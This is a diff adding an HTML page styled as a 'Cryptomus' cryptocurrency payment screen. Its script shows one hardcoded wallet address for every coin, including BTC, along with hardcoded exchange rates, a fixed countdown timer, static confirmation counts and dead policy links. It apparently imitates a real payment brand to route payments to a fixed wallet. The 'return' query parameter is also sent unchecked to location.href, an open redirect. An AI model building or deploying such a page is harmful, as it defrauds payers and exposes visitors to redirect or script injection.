@@ -1,0 +1,534 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Cryptomus</title>
+    <style>
+      html,
+      body {
+        height: 100%;
+      }
+      body {
+        margin: 0;
+        background: #000;
+        color: #f2f2f2;
+        font-family:
+          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica,
+          Arial, sans-serif;
+      }
+      .bg {
+        position: fixed;
+        inset: 0;
+        background:
+          radial-gradient(
+            60% 60% at 50% 30%,
+            rgba(255, 255, 255, 0.12),
+            rgba(0, 0, 0, 0) 60%
+          ),
+          rgba(0, 0, 0, 1);
+      }
+      .wrap {
+        position: relative;
+        min-height: 100%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 26px;
+      }
+      .card {
+        width: 380px;
+        max-width: 100%;
+        border-radius: 16px;
+        background: linear-gradient(
+          180deg,
+          #3a3a3a 0%,
+          #242424 55%,
+          #1e1e1e 100%
+        );
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
+        padding: 16px 16px 14px;
+      }
+      .top {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 10px;
+        margin-bottom: 14px;
+      }
+      .back {
+        width: 28px;
+        height: 28px;
+        border-radius: 8px;
+        border: 1px solid rgba(255, 255, 255, 0.12);
+        background: rgba(0, 0, 0, 0.22);
+        color: #fff;
+        font-size: 18px;
+        line-height: 1;
+        cursor: pointer;
+      }
+      .brand {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        font-weight: 700;
+        text-transform: lowercase;
+        color: #fff;
+        user-select: none;
+      }
+      .brandlogo {
+        width: 18px;
+        height: 18px;
+        border-radius: 4px;
+        display: inline-block;
+        object-fit: contain;
+      }
+      .brandtext {
+        font-size: 14px;
+        letter-spacing: 0.3px;
+      }
+      .amountRow {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin-bottom: 6px;
+      }
+      .bigAmount {
+        font-size: 30px;
+        font-weight: 800;
+        letter-spacing: 0.3px;
+      }
+      .copyBtn {
+        width: 26px;
+        height: 26px;
+        border-radius: 8px;
+        border: 1px solid rgba(255, 255, 255, 0.12);
+        background: rgba(0, 0, 0, 0.22);
+        color: rgba(255, 255, 255, 0.8);
+        cursor: pointer;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 13px;
+      }
+      .meta {
+        font-size: 12px;
+        color: rgba(255, 255, 255, 0.8);
+        margin-bottom: 10px;
+        font-weight: 600;
+      }
+      .netline {
+        font-size: 12px;
+        color: rgba(255, 255, 255, 0.75);
+        margin-bottom: 8px;
+        font-weight: 600;
+      }
+      .note {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        font-size: 12px;
+        color: rgba(255, 255, 255, 0.72);
+        margin-bottom: 12px;
+      }
+      .noteicon {
+        width: 18px;
+        height: 18px;
+        border-radius: 50%;
+        background: rgba(255, 255, 255, 0.12);
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: 800;
+        font-size: 12px;
+      }
+      .paybox {
+        background: rgba(0, 0, 0, 0.22);
+        border: 1px solid rgba(255, 255, 255, 0.12);
+        border-radius: 14px;
+        padding: 12px;
+        display: grid;
+        grid-template-columns: 150px 1fr;
+        gap: 12px;
+        align-items: center;
+      }
+      .qr {
+        width: 150px;
+        height: 150px;
+        border-radius: 10px;
+        background: rgba(255, 255, 255, 0.08);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        overflow: hidden;
+      }
+      .qr img {
+        width: 150px;
+        height: 150px;
+        display: block;
+      }
+      .addrLabel {
+        font-size: 11px;
+        color: rgba(255, 255, 255, 0.7);
+        margin-bottom: 6px;
+      }
+      .addrRow {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        margin-bottom: 8px;
+      }
+      .addr {
+        font-size: 12px;
+        color: rgba(255, 255, 255, 0.95);
+        font-weight: 700;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+        max-width: 170px;
+      }
+      .smallText {
+        font-size: 11px;
+        color: rgba(255, 255, 255, 0.6);
+        line-height: 1.3;
+      }
+      .smallText a {
+        color: rgba(255, 255, 255, 0.75);
+        text-decoration: underline;
+      }
+      .stats {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 0;
+        margin-top: 12px;
+        border-top: 1px solid rgba(255, 255, 255, 0.08);
+      }
+      .stat {
+        padding: 12px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 10px;
+      }
+      .stat + .stat {
+        border-left: 1px solid rgba(255, 255, 255, 0.08);
+      }
+      .statLabel {
+        font-size: 12px;
+        color: rgba(255, 255, 255, 0.72);
+        display: flex;
+        align-items: center;
+        gap: 6px;
+      }
+      .statIcon {
+        width: 18px;
+        height: 18px;
+        border-radius: 50%;
+        border: 2px solid rgba(65, 209, 125, 0.8);
+        box-sizing: border-box;
+      }
+      .statVal {
+        font-size: 12px;
+        color: #41d17d;
+        font-weight: 800;
+        letter-spacing: 0.3px;
+      }
+      .footer {
+        margin-top: 14px;
+        text-align: center;
+        font-size: 11px;
+        color: rgba(255, 255, 255, 0.55);
+      }
+      .aml {
+        color: rgba(255, 255, 255, 0.65);
+        text-decoration: underline;
+        display: inline-block;
+        margin-bottom: 8px;
+        font-weight: 600;
+      }
+      .help {
+        margin-bottom: 10px;
+      }
+      .icons {
+        display: flex;
+        gap: 10px;
+        justify-content: center;
+      }
+      .ic {
+        width: 28px;
+        height: 28px;
+        border-radius: 50%;
+        background: rgba(255, 255, 255, 0.08);
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        color: rgba(255, 255, 255, 0.75);
+        font-size: 14px;
+      }
+      @media (max-width: 420px) {
+        .paybox {
+          grid-template-columns: 1fr;
+        }
+        .addr {
+          max-width: 100%;
+        }
+        .qr,
+        .qr img {
+          width: 180px;
+          height: 180px;
+          margin: 0 auto;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="bg"></div>
+    <div class="wrap">
+      <div class="card">
+        <div class="top">
+          <button class="back" type="button" aria-label="Back">‹</button>
+          <div class="brand">
+            <img class="brandlogo" src="/assets/cca.png" alt="cca" />
+            <span class="brandtext">cryptomus</span>
+          </div>
+          <span></span>
+        </div>
+
+        <div class="amountRow">
+          <div class="bigAmount" id="cm-coin-amount">0 BTC</div>
+          <button
+            class="copyBtn"
+            type="button"
+            id="cm-copy-amount"
+            aria-label="Copy amount"
+          >
+            ⧉
+          </button>
+        </div>
+        <div class="meta" id="cm-usd-amount">0 USD</div>
+        <div class="netline" id="cm-network">Network -</div>
+        <div class="note">
+          <span class="noteicon">i</span><span>You pay network fee</span>
+        </div>
+
+        <div class="paybox">
+          <div class="qr">
+            <img id="cm-qr" alt="QR code" />
+          </div>
+          <div>
+            <div class="addrLabel">Recipient’s wallet address</div>
+            <div class="addrRow">
+              <div class="addr" id="cm-addr"></div>
+              <button
+                class="copyBtn"
+                type="button"
+                id="cm-copy-addr"
+                aria-label="Copy address"
+              >
+                ⧉
+              </button>
+            </div>
+            <div class="smallText">
+              When your payment status will change, we’ll send to you
+              notification.
+              <a href="#" onclick="return false;">Leave your email</a>
+            </div>
+          </div>
+        </div>
+
+        <div class="stats">
+          <div class="stat">
+            <div class="statLabel">
+              <span class="statIcon"></span>Expiration time
+            </div>
+            <div class="statVal" id="cm-exp">00:41:18</div>
+          </div>
+          <div class="stat">
+            <div class="statLabel">
+              <span class="statIcon"></span>Confirmations
+            </div>
+            <div class="statVal" id="cm-conf">0 from 1</div>
+          </div>
+        </div>
+
+        <div class="footer">
+          <a class="aml" href="#" onclick="return false;">AML Policy</a>
+          <div class="help">Please contact us if you have any questions</div>
+          <div class="icons">
+            <span class="ic">✈</span><span class="ic">ⓘ</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      (function () {
+        function pad2(n) {
+          return n < 10 ? "0" + String(n) : String(n);
+        }
+
+        function formatUsd(n) {
+          if (!isFinite(n)) return "0";
+          var cents = Math.round(n * 100) / 100;
+          return cents.toFixed(2);
+        }
+
+        function formatCoin(n) {
+          if (!isFinite(n)) return "0";
+          var v = Math.round(n * 100000000) / 100000000;
+          return v.toFixed(8);
+        }
+
+        var params = new URLSearchParams(location.search);
+        var usdAmount = Number(params.get("amount") || "0");
+        var usdCurrency = String(params.get("currency") || "USD").toUpperCase();
+        var coin = String(params.get("coin") || "BTC").toUpperCase();
+        var network = String(params.get("network") || "").toUpperCase();
+        var returnUrl = String(params.get("return") || "/checkout.html");
+
+        var recipientAddress = "0x9d4e6b1c2cb72a5967b05da0614fcd59f8cff6fa";
+
+        var ratesUsd = {
+          BTC: 76400,
+          ETH: 3600,
+          USDT: 1,
+          USDC: 1,
+          BNB: 600,
+          LTC: 95,
+          TRX: 0.12,
+          SOL: 170,
+          XRP: 0.55,
+          ADA: 0.45,
+          DOGE: 0.15,
+          DOT: 7.5,
+          MATIC: 0.85,
+          AVAX: 37,
+          LINK: 18,
+          BCH: 430,
+          XLM: 0.12,
+          ATOM: 10,
+          ETC: 26,
+          TON: 6.5,
+          SHIB: 0.00002,
+          UNI: 9,
+          APE: 1.7,
+          NEAR: 6.2,
+          FIL: 5.7,
+          ICP: 12.5,
+          XMR: 160,
+          EOS: 0.9,
+          XTZ: 1.1,
+          DAI: 1,
+        };
+
+        var rate = ratesUsd[coin] || 1;
+        var coinAmount = usdAmount / rate;
+
+        document.getElementById("cm-coin-amount").textContent =
+          formatCoin(coinAmount) + " " + coin;
+        document.getElementById("cm-usd-amount").textContent =
+          formatUsd(usdAmount) + " " + usdCurrency;
+        document.getElementById("cm-network").textContent =
+          "Network - " + (network || coin);
+
+        var addrEl = document.getElementById("cm-addr");
+        addrEl.textContent = recipientAddress;
+
+        var qrEl = document.getElementById("cm-qr");
+        var qrData = recipientAddress;
+        var qrUrl =
+          "https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=" +
+          encodeURIComponent(qrData);
+        qrEl.src = qrUrl;
+
+        function copyText(text) {
+          if (
+            window.isSecureContext &&
+            navigator.clipboard &&
+            navigator.clipboard.writeText
+          ) {
+            return navigator.clipboard.writeText(text).then(
+              function () {
+                return true;
+              },
+              function () {
+                return false;
+              },
+            );
+          }
+          var ta = document.createElement("textarea");
+          ta.value = text;
+          ta.style.position = "fixed";
+          ta.style.left = "-9999px";
+          document.body.appendChild(ta);
+          ta.select();
+          var ok = false;
+          try {
+            ok = document.execCommand("copy");
+          } catch (e) {
+            ok = false;
+          }
+          document.body.removeChild(ta);
+          return Promise.resolve(ok);
+        }
+
+        function flashCopy(btn) {
+          var prev = btn.textContent;
+          btn.textContent = "✓";
+          setTimeout(function () {
+            btn.textContent = prev;
+          }, 900);
+        }
+
+        document
+          .getElementById("cm-copy-addr")
+          .addEventListener("click", function () {
+            var btn = this;
+            copyText(recipientAddress).then(function (ok) {
+              if (ok) {
+                flashCopy(btn);
+                return;
+              }
+              window.prompt("Copy address:", recipientAddress);
+            });
+          });
+
+        document
+          .getElementById("cm-copy-amount")
+          .addEventListener("click", function () {
+            var btn = this;
+            var txt = formatCoin(coinAmount) + " " + coin;
+            copyText(txt).then(function (ok) {
+              if (ok) {
+                flashCopy(btn);
+                return;
+              }
+              window.prompt("Copy amount:", txt);
+            });
+          });
+
+        var until = Date.now() + (41 * 60 + 18) * 1000;
+        var expEl = document.getElementById("cm-exp");
+        function tick() {
+          var left = Math.max(0, until - Date.now());
+          var s = Math.floor(left / 1000);
+          var h = Math.floor(s / 3600);
+          var m = Math.floor((s % 3600) / 60);
+          var r = s % 60;
+          expEl.textContent = pad2(h) + ":" + pad2(m) + ":" + pad2(r);
+          if (left > 0) setTimeout(tick, 250);
+        }
+        tick();
+
+        function goBack() {
+          location.href = returnUrl;
+        }
+
+        document.querySelector(".back").addEventListener("click", goBack);
+        document.addEventListener("keydown", function (e) {
+          if (e.key === "Escape") goBack();
+        });
+      })();
+    </script>
+  </body>
+</html>
